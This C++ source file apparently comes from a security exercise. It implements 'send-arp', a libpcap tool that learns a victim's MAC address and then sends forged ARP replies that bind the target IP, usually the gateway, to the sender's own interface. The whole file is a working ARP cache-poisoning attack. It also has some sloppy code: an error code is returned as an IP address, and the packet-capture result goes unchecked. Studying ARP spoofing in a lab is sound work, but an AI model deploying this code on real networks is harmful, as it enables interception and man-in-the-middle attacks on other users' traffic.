#include <cstdio>
#include <pcap.h>
#include <time.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Ip getIp(const char *ifname)
{
	struct ifreq ifr;
	int sockfd;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0)
	{
		printf("Error: create socket\n");
		return EXIT_FAILURE;
	}

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	ifr.ifr_name[IFNAMSIZ - 1] = '\0';

	if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0)
	{
		printf("Error: get interface IP address\n");
		close(sockfd);
		return EXIT_FAILURE;
	}

	close(sockfd);

	struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
	return Ip(ntohl(sin->sin_addr.s_addr));
}

Mac getMacByArpRequest(pcap_t *pcap, Mac interface_mac, Ip my_ip, Ip target_ip)
{
	printf("My IP: %s\n", std::string(my_ip).c_str());
	printf("Target IP: %s\n", std::string(target_ip).c_str());
	printf("My MAC: %s\n", std::string(interface_mac).c_str());

	// ARP Request 패킷
	EthArpPacket request_packet;

	request_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	request_packet.eth_.smac_ = interface_mac;
	request_packet.eth_.type_ = htons(EthHdr::Arp);

	request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	request_packet.arp_.pro_ = htons(EthHdr::Ip4);
	request_packet.arp_.hln_ = Mac::Size;
	request_packet.arp_.pln_ = Ip::Size;
	request_packet.arp_.op_ = htons(ArpHdr::Request);
	request_packet.arp_.smac_ = interface_mac;
	request_packet.arp_.sip_ = htonl(my_ip);
	request_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	request_packet.arp_.tip_ = htonl(target_ip);

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&request_packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "Error: ARP request\n");
		return Mac::nullMac();
	}

	struct pcap_pkthdr *header;
	const u_char *packet_data;

	time_t start_time = time(nullptr);

	while (time(nullptr) - start_time < 5)
	{

		res = pcap_next_ex(pcap, &header, &packet_data);

		EthArpPacket *received_packet = (EthArpPacket *)packet_data;
		uint16_t eth_type = ntohs(received_packet->eth_.type_);
		uint16_t arp_op = ntohs(received_packet->arp_.op_);

		Ip sender_ip = ntohl(received_packet->arp_.sip_);
		if (sender_ip == target_ip)
		{
			Mac sender_mac = received_packet->arp_.smac_;
			printf("Found MAC for %s: %s\n",
				   std::string(target_ip).c_str(),
				   std::string(sender_mac).c_str());
			return sender_mac;
		}
	}
	printf("Error: No ARP reply\n");
	return Mac::nullMac();
}

int main(int argc, char *argv[])
{
	if (argc < 4 || (argc - 2) % 2 != 0)
	{
		usage();
		return EXIT_FAILURE;
	}

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	Mac interface_mac = Mac::getMac(dev);

	for (int i = 2; i < argc; i += 2)
	{
		const char *senderIp = argv[i];
		const char *targetIp = argv[i + 1];

		Ip my_ip = getIp(dev);
		Mac sender_mac = getMacByArpRequest(pcap, interface_mac, my_ip, Ip(senderIp));

		EthArpPacket packet;

		packet.eth_.dmac_ = sender_mac;
		packet.eth_.smac_ = interface_mac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::Size;
		packet.arp_.pln_ = Ip::Size;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = interface_mac;
		packet.arp_.sip_ = htonl(Ip(targetIp));
		packet.arp_.tmac_ = sender_mac;
		packet.arp_.tip_ = htonl(Ip(senderIp));

		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
		if (res != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
	}
	pcap_close(pcap);
}
